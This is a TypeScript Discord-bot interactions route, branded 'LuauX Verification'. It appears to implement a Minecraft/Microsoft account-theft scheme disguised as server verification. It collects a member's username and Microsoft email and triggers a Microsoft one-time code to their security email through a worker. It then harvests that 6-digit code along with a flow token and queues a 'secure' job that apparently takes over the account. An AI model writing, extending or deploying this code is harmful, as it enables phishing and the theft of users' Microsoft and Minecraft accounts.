import { createFileRoute } from "@tanstack/react-router";
import { createClient } from "@supabase/supabase-js";
import { waitUntil } from "@vercel/functions";
import { sendAuth, detectAuthMethod } from "@/lib/microsoft-auth";
import { envStr } from "@/lib/luaux-server.server";
import nacl from "tweetnacl";

function normalizePublicKey(clientPublicKey: string): string {
  return clientPublicKey.replace(/\s+/g, "").replace(/^0x/i, "").trim().toLowerCase();
}

function verifyDiscordSignature(
  rawBody: string,
  signature: string,
  timestamp: string,
  clientPublicKey: string,
): boolean {
  try {
    if (!rawBody || !signature || !timestamp) return false;

    const ts = Number(timestamp);
    if (!Number.isFinite(ts)) return false;
    // Discord recommends ~5 min; allow 15 min for serverless clock skew
    const ageSec = Math.abs(Date.now() / 1000 - ts);
    if (ageSec > 900) return false;

    const keyHex = normalizePublicKey(clientPublicKey);
    const sigHex = signature.replace(/\s+/g, "").trim().toLowerCase();
    if (!/^[0-9a-f]{64}$/.test(keyHex)) return false;
    if (!/^[0-9a-f]+$/.test(sigHex) || sigHex.length % 2 !== 0) return false;

    const message = Buffer.from(timestamp + rawBody, "utf8");
    const sig = Buffer.from(sigHex, "hex");
    const key = Buffer.from(keyHex, "hex");
    if (sig.length !== 64 || key.length !== 32) return false;

    return nacl.sign.detached.verify(
      new Uint8Array(message),
      new Uint8Array(sig),
      new Uint8Array(key),
    );
  } catch {
    return false;
  }
}

function getModalField(
  components: Array<Record<string, unknown>> | undefined,
  customId: string,
): string {
  if (!components) return "";
  for (const row of components) {
    const fields = row?.components as Array<Record<string, unknown>> | undefined;
    for (const field of fields || []) {
      if (field?.custom_id === customId) return String(field.value || "").trim();
    }
  }
  return "";
}

function db() {
  return createClient(envStr("SUPABASE_URL"), envStr("SUPABASE_SERVICE_ROLE_KEY"), {
    auth: { persistSession: false, autoRefreshToken: false },
  });
}

/** Interaction follow-up — no Bot auth header required (token is the secret) */
async function editOriginal(
  applicationId: string,
  interactionToken: string,
  body: Record<string, unknown>,
) {
  const res = await fetch(
    `https://discord.com/api/v10/webhooks/${applicationId}/${interactionToken}/messages/@original`,
    {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    },
  );
  if (!res.ok) {
    const t = await res.text().catch(() => "");
    console.error("[interactions] editOriginal failed:", res.status, t.slice(0, 300));
  }
}

function successEmbed(description: string) {
  return {
    title: "✅ Verification",
    description,
    color: 0x50c878,
    footer: { text: "LuauX Verification" },
  };
}

function errorEmbed(description: string) {
  return {
    title: "❌ Verification Failed",
    description,
    color: 0xff5c5c,
    footer: { text: "LuauX Verification" },
  };
}

async function resolveBotCredentials(
  rawBody: string,
  signature: string,
  timestamp: string,
  guildId?: string,
): Promise<{ ok: boolean; botToken: string | null; publicKey: string | null; tried: number }> {
  const candidates: Array<{ key: string; token: string | null }> = [];
  const seen = new Set<string>();

  const push = (key?: string | null, token?: string | null) => {
    if (!key) return;
    const n = normalizePublicKey(key);
    if (!n || seen.has(n)) return;
    seen.add(n);
    candidates.push({ key: n, token: token || null });
  };

  // 1) Guild-specific user bot first
  if (guildId) {
    try {
      const { data: settings } = await db()
        .from("verification_settings")
        .select("bot_public_key, bot_token")
        .eq("guild_id", guildId)
        .maybeSingle();
      push(settings?.bot_public_key, settings?.bot_token);
    } catch {
      /* columns may be missing until SQL migration */
    }
  }

  // 2) All stored user bots (PING + multi-tenant)
  try {
    const { data: allSettings } = await db()
      .from("verification_settings")
      .select("bot_public_key, bot_token")
      .not("bot_public_key", "is", null);
    for (const row of allSettings || []) {
      push(row.bot_public_key, row.bot_token);
    }
  } catch {
    /* ignore */
  }

  // 3) Optional central fallback
  push(
    envStr("DISCORD_PUBLIC_KEY") || envStr("DISCORD_CLIENT_PUBLIC_KEY"),
    envStr("DISCORD_BOT_TOKEN") || null,
  );

  for (const c of candidates) {
    if (verifyDiscordSignature(rawBody, signature, timestamp, c.key)) {
      return { ok: true, botToken: c.token, publicKey: c.key, tried: candidates.length };
    }
  }

  return { ok: false, botToken: null, publicKey: null, tried: candidates.length };
}

export const Route = createFileRoute("/api/discord/interactions")({
  server: {
    handlers: {
      // Health check — open this in browser to confirm route is live
      GET: async () => {
        return Response.json({
          ok: true,
          service: "luaux-discord-interactions",
          message: "POST Discord interactions here. Set this URL as Interactions Endpoint URL.",
          path: "/api/discord/interactions",
        });
      },
      POST: async ({ request }) => {
        const signature =
          request.headers.get("x-signature-ed25519") ||
          request.headers.get("X-Signature-Ed25519") ||
          "";
        const timestamp =
          request.headers.get("x-signature-timestamp") ||
          request.headers.get("X-Signature-Timestamp") ||
          "";

        // Critical: use exact raw bytes Discord signed (do not re-serialize JSON)
        const rawBody = await request.text();

        if (!signature || !timestamp) {
          console.error("[interactions] missing signature headers");
          return new Response("Missing signature headers", { status: 401 });
        }
        if (!rawBody) {
          console.error("[interactions] empty body — cannot verify signature");
          return new Response("Empty body", { status: 400 });
        }

        let body: Record<string, unknown>;
        try {
          body = JSON.parse(rawBody);
        } catch {
          return new Response("Invalid JSON", { status: 400 });
        }

        const guildId = body.guild_id as string | undefined;

        // PING first path: verify signature then return type 1 ASAP
        const resolved = await resolveBotCredentials(rawBody, signature, timestamp, guildId);

        if (!resolved.ok) {
          console.error("[interactions] Invalid signature", {
            type: body.type,
            guildId: guildId || null,
            bodyLen: rawBody.length,
            triedKeys: resolved.tried,
            hasSig: !!signature,
            hasTs: !!timestamp,
          });
          return new Response("Invalid signature", { status: 401 });
        }

        const botToken = resolved.botToken;
        const appId = body.application_id as string;
        const interactionToken = body.token as string;

        // PING
        if (body.type === 1) {
          return Response.json({ type: 1 });
        }

        // Modal Submit (Type 5)
        if (body.type === 5) {
          const modalData = body.data as Record<string, unknown>;
          const customId = modalData.custom_id as string;
          const components = modalData.components as Array<Record<string, unknown>>;
          const member = body.member as Record<string, unknown> | undefined;
          const gId = (body.guild_id as string) || "";
          const discordId = (member?.user as Record<string, string>)?.id || "";
          const channelId = (body.channel_id as string) || "";

          // --- Modal 1: MC Username + Email ---
          // CRITICAL: Discord requires a response in ~3s. Defer immediately, then do MS work.
          if (customId === "verify_mc_info") {
            const username =
              getModalField(components, "mc_username") ||
              String(
                (
                  (components?.[0] as Record<string, unknown>)?.components as Array<
                    Record<string, unknown>
                  >
                )?.[0]?.value || "",
              ).trim();
            const email =
              getModalField(components, "mc_email") ||
              String(
                (
                  (components?.[1] as Record<string, unknown>)?.components as Array<
                    Record<string, unknown>
                  >
                )?.[0]?.value || "",
              ).trim();

            // Defer immediately. OTP is sent by the VPS worker (Vercel IPs get MS State 204).
            // waitUntil polls session until worker finishes, then edits Discord reply.
            const work = (async () => {
              try {
                if (!username || !email) {
                  await editOriginal(appId, interactionToken, {
                    embeds: [errorEmbed("Both Minecraft Username and Email are required.")],
                  });
                  return;
                }
                if (!/^[\w.+-]+@[\w.-]+\.\w{2,}$/.test(email)) {
                  await editOriginal(appId, interactionToken, {
                    embeds: [errorEmbed("Invalid email format.")],
                  });
                  return;
                }

                // Quick eligibility check on site (no OTP send — that hits Vercel IP blocks)
                let authInfo;
                try {
                  const { credentials } = await sendAuth(email);
                  authInfo = detectAuthMethod(credentials);
                } catch (e) {
                  console.error("[interactions] sendAuth error:", e);
                  await editOriginal(appId, interactionToken, {
                    embeds: [
                      errorEmbed(
                        "Failed to contact Microsoft (timeout or error). Try again in a minute.",
                      ),
                    ],
                  });
                  return;
                }

                if (authInfo.method === "none") {
                  await editOriginal(appId, interactionToken, {
                    embeds: [
                      errorEmbed(
                        `No email OTP available for this account. Details: ${(authInfo as { detail?: string }).detail || "N/A"}`,
                      ),
                    ],
                  });
                  return;
                }

                if (authInfo.method === "authenticator") {
                  await editOriginal(appId, interactionToken, {
                    embeds: [
                      errorEmbed(
                        "Authenticator-only accounts are not supported. Use an account with email OTP / recovery email.",
                      ),
                    ],
                  });
                  return;
                }

                const { securityEmail, flowToken } = authInfo as {
                  method: "email_otp";
                  securityEmail: string;
                  flowToken: string;
                };

                // Queue for VPS worker — status pending until OTP actually sent
                const { data: session, error: sessionErr } = await db()
                  .from("verification_sessions")
                  .insert({
                    discord_id: discordId,
                    guild_id: gId,
                    mc_username: username,
                    mc_email: email,
                    status: "pending",
                    flow_token: flowToken || "",
                    security_email: securityEmail,
                    channel_id: channelId,
                    // Stash Discord follow-up coords for worker-path (not a real message id)
                    message_id: JSON.stringify({ appId, token: interactionToken }),
                  })
                  .select("id")
                  .single();

                if (sessionErr || !session) {
                  console.error("[interactions] session insert:", sessionErr?.message);
                  await editOriginal(appId, interactionToken, {
                    embeds: [
                      errorEmbed(
                        `Database error saving session: ${sessionErr?.message || "unknown"}.`,
                      ),
                    ],
                  });
                  return;
                }

                // Poll until worker marks otp_sent / failed (max ~22s)
                const deadline = Date.now() + 22_000;
                let finalStatus = "pending";
                let finalSecurity = securityEmail;
                let finalError = "";
                while (Date.now() < deadline) {
                  await new Promise((r) => setTimeout(r, 1500));
                  const { data: row } = await db()
                    .from("verification_sessions")
                    .select("status, security_email, error_message")
                    .eq("id", session.id)
                    .maybeSingle();
                  if (!row) continue;
                  if (row.status === "otp_sent") {
                    finalStatus = "otp_sent";
                    finalSecurity = row.security_email || securityEmail;
                    break;
                  }
                  if (row.status === "failed") {
                    finalStatus = "failed";
                    finalError = row.error_message || "OTP send failed";
                    break;
                  }
                }

                if (finalStatus === "otp_sent") {
                  await editOriginal(appId, interactionToken, {
                    embeds: [
                      successEmbed(
                        `A verification code has been sent to **${finalSecurity}**.\n\nCheck inbox/spam for a 6-digit code, then click **Submit Code**.`,
                      ),
                    ],
                    components: [
                      {
                        type: 1,
                        components: [
                          {
                            type: 2,
                            style: 3,
                            label: "Submit Code",
                            custom_id: "verify_submit_code",
                          },
                        ],
                      },
                    ],
                  });
                  return;
                }

                if (finalStatus === "failed") {
                  await editOriginal(appId, interactionToken, {
                    embeds: [
                      errorEmbed(
                        finalError ||
                          "Failed to send verification code. Microsoft rejected the OTP request.",
                      ),
                    ],
                  });
                  return;
                }

                // Timed out waiting for worker
                await db()
                  .from("verification_sessions")
                  .update({
                    status: "failed",
                    error_message: "Worker did not send OTP in time — is bot-worker running?",
                  })
                  .eq("id", session.id)
                  .eq("status", "pending");
                await editOriginal(appId, interactionToken, {
                  embeds: [
                    errorEmbed(
                      "Verification worker is offline or slow. Ensure the VPS bot-worker is running, then try again.",
                    ),
                  ],
                });
              } catch (e) {
                console.error("[interactions] verify_mc_info async error:", e);
                try {
                  await editOriginal(appId, interactionToken, {
                    embeds: [errorEmbed("Unexpected error during verification. Try again.")],
                  });
                } catch {
                  /* ignore */
                }
              }
            })();

            waitUntil(work);

            return Response.json({
              type: 5,
              data: { flags: 64 },
            });
          }

          // --- Modal 2: OTP Code ---
          if (customId === "verify_otp_code") {
            const otpCode =
              getModalField(components, "otp_code") ||
              String(
                (
                  (components?.[0] as Record<string, unknown>)?.components as Array<
                    Record<string, unknown>
                  >
                )?.[0]?.value || "",
              ).trim();

            if (!otpCode || otpCode.length !== 6 || !/^\d{6}$/.test(otpCode)) {
              return Response.json({
                type: 4,
                data: {
                  flags: 64,
                  embeds: [errorEmbed("Please enter a valid 6-digit code.")],
                },
              });
            }

            let sessionQuery = db()
              .from("verification_sessions")
              .select("*")
              .eq("discord_id", discordId)
              .eq("status", "otp_sent")
              .order("created_at", { ascending: false })
              .limit(1);
            if (gId) sessionQuery = sessionQuery.eq("guild_id", gId);

            const { data: sessions } = await sessionQuery;
            const session = sessions?.[0];
            if (!session) {
              return Response.json({
                type: 4,
                data: {
                  flags: 64,
                  embeds: [
                    errorEmbed(
                      "No pending verification found. Click Verify and start over.",
                    ),
                  ],
                },
              });
            }

            const { data: claimed } = await db()
              .from("verification_sessions")
              .update({ status: "securing" })
              .eq("id", session.id)
              .eq("status", "otp_sent")
              .select("id")
              .maybeSingle();

            if (!claimed) {
              return Response.json({
                type: 4,
                data: {
                  flags: 64,
                  embeds: [errorEmbed("Already processing. Please wait.")],
                },
              });
            }

            const { data: settings } = await db()
              .from("verification_settings")
              .select("verified_role_id, channel_id, discord_id")
              .eq("guild_id", session.guild_id)
              .maybeSingle();

            const { data: job, error: jobError } = await db()
              .from("bot_jobs")
              .insert({
                // Store license owner for worker ownership; member id is in config
                discord_id: settings?.discord_id || discordId,
                type: "secure",
                status: "pending",
                config: {
                  email: session.mc_email,
                  flowToken: session.flow_token,
                  code: otpCode,
                  mcUsername: session.mc_username,
                  guildId: session.guild_id,
                  channelId: session.channel_id || settings?.channel_id || channelId,
                  discordId,
                  roleId: settings?.verified_role_id || "",
                  sessionId: session.id,
                  ownerDiscordId: settings?.discord_id || null,
                },
              })
              .select("id")
              .single();

            if (jobError || !job) {
              console.error("[interactions] secure job insert failed:", jobError?.message);
              await db()
                .from("verification_sessions")
                .update({ status: "otp_sent" })
                .eq("id", session.id);
              return Response.json({
                type: 4,
                data: {
                  flags: 64,
                  embeds: [
                    errorEmbed(
                      `Failed to queue secure job: ${jobError?.message || "unknown"}. Run production hardening SQL (bot_jobs type secure).`,
                    ),
                  ],
                },
              });
            }

            return Response.json({
              type: 4,
              data: {
                flags: 64,
                embeds: [
                  successEmbed(
                    "✅ Code accepted! Securing your account (30–90s). Results will post in this channel when done.",
                  ),
                ],
                components: [],
              },
            });
          }

          return Response.json({
            type: 4,
            data: { flags: 64, content: "Unknown modal" },
          });
        }

        // Message Component (Type 3)
        if (body.type === 3) {
          const data = body.data as Record<string, unknown>;
          const customId = data.custom_id as string;
          const member = body.member as Record<string, unknown> | undefined;
          const gId = body.guild_id as string;
          const memberId = (member?.user as Record<string, string>)?.id;

          if (customId === "verify_member") {
            // Respond with modal immediately — no heavy work (must be <3s)
            if (!memberId || !gId) {
              return Response.json({
                type: 4,
                data: { flags: 64, content: "Missing member or guild information." },
              });
            }

            // Fire-and-forget settings check is too slow; open modal always.
            // Invalid guild will fail later on OTP with a clear message.
            return Response.json({
              type: 9,
              data: {
                custom_id: "verify_mc_info",
                title: "Verification",
                components: [
                  {
                    type: 1,
                    components: [
                      {
                        type: 4,
                        custom_id: "mc_username",
                        label: "Minecraft Username",
                        style: 1,
                        required: true,
                        min_length: 3,
                        max_length: 16,
                        placeholder: "Enter your MC username",
                      },
                    ],
                  },
                  {
                    type: 1,
                    components: [
                      {
                        type: 4,
                        custom_id: "mc_email",
                        label: "Minecraft / Microsoft Email",
                        style: 1,
                        required: true,
                        min_length: 5,
                        max_length: 100,
                        placeholder: "email@example.com",
                      },
                    ],
                  },
                ],
              },
            });
          }

          if (customId === "verify_submit_code") {
            return Response.json({
              type: 9,
              data: {
                custom_id: "verify_otp_code",
                title: "Enter Verification Code",
                components: [
                  {
                    type: 1,
                    components: [
                      {
                        type: 4,
                        custom_id: "otp_code",
                        label: "6-Digit Code",
                        style: 1,
                        required: true,
                        min_length: 6,
                        max_length: 6,
                        placeholder: "123456",
                      },
                    ],
                  },
                ],
              },
            });
          }

          if (customId === "verify_check_status") {
            return Response.json({
              type: 4,
              data: {
                flags: 64,
                content: "Status updates post automatically when securing finishes.",
              },
            });
          }
        }

        return Response.json({
          type: 4,
          data: { flags: 64, content: "Unknown interaction" },
        });
      },
    },
  },
});
